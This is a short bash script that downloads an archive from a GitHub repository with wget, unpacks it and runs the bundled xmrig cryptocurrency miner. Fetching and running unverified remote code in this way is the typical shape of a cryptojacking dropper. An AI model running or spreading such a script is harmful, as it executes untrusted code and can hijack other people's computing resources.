#!/bin/bash
wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/ok1.tar.gz
tar xvf  ok1.tar.gz
cd ok1
cd ok1
chmod +x xmrig
./xmrig
